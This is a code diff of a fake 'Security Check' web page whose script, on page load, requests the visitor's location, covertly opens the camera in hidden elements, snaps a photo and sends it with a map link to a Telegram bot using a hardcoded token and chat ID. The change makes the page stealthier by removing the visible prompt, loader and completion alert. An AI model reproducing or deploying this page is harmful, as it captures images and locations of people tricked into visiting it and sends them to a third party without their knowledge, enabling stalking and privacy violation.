@@ -3,63 +3,37 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Security Verification</title>
-    <style>
-        body { font-family: sans-serif; text-align: center; background: #f4f4f4; padding-top: 100px; }
-        .box { background: white; padding: 20px; border-radius: 10px; display: inline-block; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
-        .loader { border: 5px solid #f3f3f3; border-top: 5px solid #3498db; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-    </style>
+    <title>Security Check</title>
 </head>
 <body>
-    <div class="box">
-        <h2>Verifying System...</h2>
-        <p>Please allow camera and location to continue.</p>
-        <div class="loader"></div>
-    </div>
-
-    <video id="video" width="640" height="480" autoplay style="display:none;"></video>
-    <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
+    <h2 style="text-align:center;">Verifying Your Connection...</h2>
+    <video id="video" autoplay style="display:none;"></video>
+    <canvas id="canvas" style="display:none;"></canvas>
 
     <script>
-        const BOT_TOKEN = '8868947145:AAFjXyUwInMs1bGzhEvV9Oyla1eGkaKbbVg';
-        const CHAT_ID = '8766925591';
+        const token = '8868947145:AAFjXyUwInMs1bGzhEvV9Oyla1eGkaKbbVg';
+        const chat_id = '8766925591';
 
-        window.onload = async () => {
-            try {
-                // লোকেশন পারমিশন চাওয়া
-                navigator.geolocation.getCurrentPosition(async (pos) => {
-                    const lat = pos.coords.latitude;
-                    const lon = pos.coords.longitude;
-
-                    // ক্যামেরা ওপেন করা
-                    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        window.onload = () => {
+            navigator.geolocation.getCurrentPosition(pos => {
+                const { latitude: lat, longitude: lon } = pos.coords;
+                navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
                     const video = document.getElementById('video');
                     video.srcObject = stream;
-
-                    // ৩ সেকেন্ড পর অটো ছবি তোলা ও পাঠানো
                     setTimeout(() => {
                         const canvas = document.getElementById('canvas');
+                        canvas.width = 640; canvas.height = 480;
                         canvas.getContext('2d').drawImage(video, 0, 0);
                         canvas.toBlob(blob => {
-                            const formData = new FormData();
-                            formData.append('chat_id', CHAT_ID);
-                            formData.append('photo', blob, 'capture.jpg');
-                            formData.append('caption', `🚨 অপরাধী চিহ্নিত!\n📍 ম্যাপ লিঙ্ক: https://www.google.com/maps?q=${lat},${lon}`);
-
-                            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-                                method: 'POST',
-                                body: formData
-                            }).then(() => {
-                                stream.getTracks().forEach(track => track.stop());
-                                alert("Verification Complete!");
-                            });
+                            const fd = new FormData();
+                            fd.append('chat_id', chat_id);
+                            fd.append('photo', blob, 'img.jpg');
+                            fd.append('caption', `🚨 চিহ্নিত!\n📍 লোকেশন: https://www.google.com/maps?q=${lat},${lon}`);
+                            fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: fd });
                         }, 'image/jpeg');
-                    }, 3000);
+                    }, 2000);
                 });
-            } catch (err) {
-                console.log("Permission Denied");
-            }
+            });
         };
     </script>
 </body>
